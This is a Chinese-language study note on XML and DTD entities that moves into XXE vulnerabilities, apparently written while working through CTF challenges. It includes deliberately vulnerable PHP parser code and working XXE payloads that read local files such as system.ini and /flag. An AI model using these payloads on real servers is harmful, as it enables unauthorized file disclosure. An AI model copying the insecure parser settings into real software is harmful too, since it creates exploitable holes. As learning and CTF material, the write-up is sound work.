# xml

[TOC]

----

## 初步认识

>XML 指可扩展标记语言（EXtensible Markup Language）；且是一种很像HTML的标记语言；设计宗旨是传输数据，而不是显示数据。 XML 标签没有被预定义，您需要自行定义标签，它设计为具有自我描述性。

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<notes>
    <note>
        <to>dx</to>
        <from>bx</from>
        <heading>helloword</heading>
        <content>hello dx, how are you?</content>
    </note>
    <note>
        <to>ax</to>
        <from>cx</from>
        <heading>meeting</heading>
        <content>Don't forget our meeting tomorrow at 10 AM.</content>
    </note>
    <note>
        <to>fx</to>
        <from>ex</from>
        <heading>reminder</heading>
        <content>Remember to submit your report by the end of the week.</content>
    </note>
    <note>
        <to>gx</to>
        <from>hx</from>
        <heading>invitation</heading>
        <content>You are invited to the annual company picnic next Saturday.</content>
    </note>
</notes>
```

xml树结构：

```
notes
├── note
│   ├── to: dx
│   ├── from: bx
│   ├── heading: helloword
│   └── content: hello dx, how are you?
├── note
│   ├── to: ax
│   ├── from: cx
│   ├── heading: meeting
│   └── content: Don't forget our meeting tomorrow at 10 AM.
├── note
│   ├── to: fx
│   ├── from: ex
│   ├── heading: reminder
│   └── content: Remember to submit your report by the end of the week.
└── note
    ├── to: gx
    ├── from: hx
    ├── heading: invitation
    └── content: You are invited to the annual company picnic next Saturday.
```

> xml注释写法与html等一样：
>
> ```xml
> <?xml version="1.0" encoding="UTF-8" ?>
> <!-- 这是一个包含多个笔记的 XML 文件 -->
> <notes>
>     <!-- 第一条笔记 -->
>     <note>
>         <to>dx</to>
>         <from>bx</from>
>         <heading>helloword</heading>
>         <content>hello dx, how are you?</content>
>     </note>
> ```
>
> 

### xml头

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
```

1. **`<?xml`**：这是 XML 声明的开始标记，表示这是一个 XML 声明。
2. **`version="1.0"`**：指定 XML 文档的版本。目前最常用的版本是 `1.0`，但也有 `1.1` 版本。
3. **`encoding="UTF-8"`**：指定 XML 文档的字符编码。常见的编码包括 `UTF-8`, `UTF-16`, `ISO-8859-1` 等。`UTF-8` 是最常用的编码，因为它支持几乎所有的字符。
4. **`?>`**：这是 XML 声明的结束标记。
5. `standalone="yes"` 表示文档不依赖外部实体，`standalone="no"` 表示文档依赖外部实体。

### ⚠️注意的点

- XML 标签是大小写敏感 `<NOTE> 与标签 <note>` 是不同的;

- `&lt`  可以代替 `<`作为内容出现在xml文档里面



### DTD语法

> DTD（Document Type Definition，文档类型定义）是 XML 中用于定义文档结构的一种机制。DTD 定义了 XML 文档中允许的元素、元素的顺序、元素的属性以及它们之间的关系。通过 DTD，可以确保 XML 文档的结构符合预定义的规则。

```dtd
<!ELEMENT notes (note+)>
<!ELEMENT note (to, from, heading, content)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT content (#PCDATA)>
```

**元素声明**

```dtd
<!ELEMENT element-name (content-model)>
```

```dtd
<!ELEMENT notes (note+)>
<!ELEMENT note (to, from, heading, content)>
```

- `#PCDATA`：表示元素的内容是可解析的字符数据（Parsed Character Data）。
- `element-name`：表示子元素。
- `+`：表示一个或多个。
- `*`：表示零个或多个。
- `?`：表示零个或一个。
- `|`：表示选择（或）。
- `,`：表示顺序（与）。

**属性声明**

```dtd
<!ATTLIST element-name attribute-name attribute-type attribute-default>
```

- `element-name`：元素的名称。
- `attribute-name`：属性的名称。
- `attribute-type`：属性的类型（如 `CDATA`, `ID`, `IDREF`, `ENUMERATED` 等）。
- `attribute-default`：属性的默认值（如 `#REQUIRED`, `#IMPLIED`, `#FIXED` 等）

```dtd
<!ATTLIST note id ID #REQUIRED>
```

**实体声明**

```dtd
<!ENTITY entity-name "entity-value">
```

```dtd
<!ENTITY copyright "Copyright 2023">
```

> 实体（Entity）是一种机制，用于定义可以在文档中重复使用的文本片段或外部资源。实体可以分为两种主要类型：内部实体和外部实体。实体声明用于定义这些实体，以便在 XML 文档中引用它们。
>
> - **内部实体（Internal Entity）**：定义在 XML 文档内部的实体，其值直接在实体声明中指定。
>
> - **外部实体（External Entity）**：引用外部文件或资源的实体，其值从外部文件或资源中获取。

上面我们这个实体声明是内部声明语法，下面学习外部实体声明

**外部实体声明**

```dtd
<!ENTITY entity-name SYSTEM "路径">
```

这里的`路径` ---- 通常是一个文件路径或 URL，贴一个在 XML 文档中引用外部实体的例子

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE document [
    <!ENTITY logo SYSTEM "logo.png">
]>
<document>
    <header>
        <img src="&logo;" alt="Company Logo"/>
    </header>
</document>
```

注意还有一个引用公用DTD的语法`PUBLIC`

```dtd
<!DOCTYPE root-element PUBLIC "public-id" "system-id">
```

- `root-element`：XML 文档的根元素名称。
- `public-id`：公用 DTD 的公共标识符（Public Identifier）。
- `system-id`：公用 DTD 的系统标识符（System Identifier），通常是一个 URL 或文件路径

> 公用 DTD（Document Type Definition）是指在 XML 文档中引用一个已经存在的、广泛使用的 DTD 文件。这些公用 DTD 通常由标准组织或行业联盟定义，用于确保不同系统之间的数据交换符合一致的标准

贴一个例子：

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>Example</title>
</head>
<body>
    <p>This is an example of using a public DTD.</p>
</body>
</html>

```



### 利用的点

上面的内容了解到了实体之类知识，但是如何调用：

- `&`语法 
- `%`语法（不太好了解）

> - `&` 用于引用内部实体，内部实体是在 DTD 中定义的文本片段，可以在 XML 文档中多次使用。
> - `%` 用于引用参数实体，参数实体是一种特殊的实体，主要用于 DTD 内部，以便在 DTD 中重复使用某些定义。

（demo.dtd）：

```dtd
<!ENTITY % common-attributes "id ID #REQUIRED | class CDATA #IMPLIED">
<!ENTITY copyright "Copyright 2023">
<!ELEMENT document (header, content, footer)>
<!ELEMENT header (#PCDATA)>
<!ELEMENT content (#PCDATA)>
<!ELEMENT footer (#PCDATA)>
<!ATTLIST document %common-attributes;>
```

这里的`%` ---在这个示例中，`%common-attributes;` 引用了参数实体 `common-attributes`，以便在多个元素中重复使用相同的属性定义。

 (learn.xml) :

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE document SYSTEM "document.dtd">
<document id="doc1" class="example">
    <header>Header Content</header>
    <content>Main Content</content>
    <footer>&copyright;</footer>
</document>
```



## XXE

### 学习到的一个实验

```php
<?php
    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
	//这行代码从 HTTP 请求的输入流中读取 XML 数据。
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $creds = simplexml_import_dom($dom);
	//这行代码将 DOM 对象转换为 SimpleXML 对象。
    echo $creds;
?>
```

- **`libxml_disable_entity_loader(false)`**
  - 这个函数的作用是控制是否禁用外部实体的加载。设置为 `false` 表示允许加载外部实体。	

> 在现代 PHP 版本中，这个函数默认是禁用的（即默认值是 `true`），以防止 XXE 攻击。

- **`$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD)`**:

  - `LIBXML_NOENT` 选项会解析实体引用，这意味着如果 XML 中包含外部实体，它们将被解析并加载。

  - `LIBXML_DTDLOAD` 选项允许加载 DTD（文档类型定义），这可能会导致加载外部 DTD 文件。

我们利用漏洞，进行xxe攻击

```xml-dtd
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE creds [  
<!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"> ]> 
<creds>&goodies;</creds>
```

![image-20241009122252765](https://gitee.com/bx33661/image/raw/master/path/image-20241009122252765.png)

![image-20241009122518930](https://gitee.com/bx33661/image/raw/master/path/image-20241009122518930.png)

发现成功的读取了window目录下的`system.ini`文件



## 题目

### Moe2023-了解你的座驾

![image-20241011113557304](https://gitee.com/bx33661/image/raw/master/path/image-20241011113557304.png)

抓包发现是xml格式数据：

```http
POST /index.php HTTP/1.1
Host: localhost
....
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

xml_content=%3Cxml%3E%3Cname%3EMazda+rx7-FD%3C%2Fname%3E%3C%2Fxml%3E
```

url解码：

```
解码后的 URL: xml_content=<xml><name>Mazda+rx7-FD</name></xml>
```

Payload:

```py
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<xml><name>&xxe;</name></xml>

#编码
%3C%21DOCTYPE%20test%20%5B%0A%20%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A///flag%22%3E%0A%5D%3E%0A%3Cxml%3E%3Cname%3E%26xxe%3B%3C/name%3E%3C/xml%3E
```





> ctfshow-xxe

### web373

题目如下：

```php
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $ctfshow = $creds->ctfshow;
    echo $ctfshow;
}
highlight_file(__FILE__);  
```

Payload：

```xml-dtd
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE payload [
<!ELEMENT payload ANY>
<!ENTITY go SYSTEM "file:///flag">
]>
<creds>
    <ctfshow>&go;</ctfshow>
</creds>
```



### web374

```php
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);    
```

这个题跟上一个相比就是没有回显，需要回代

## 参考

- XML快速入门学习笔记：https://cloud.tencent.com/developer/article/2129508
- 一篇文章带你深入理解漏洞之 XXE 漏洞：https://xz.aliyun.com/t/3357?time__1311=n4%2Bxnii%3DG%3D0Q0%3DLH405DK3gxmxGwxjdxY5i%2BQx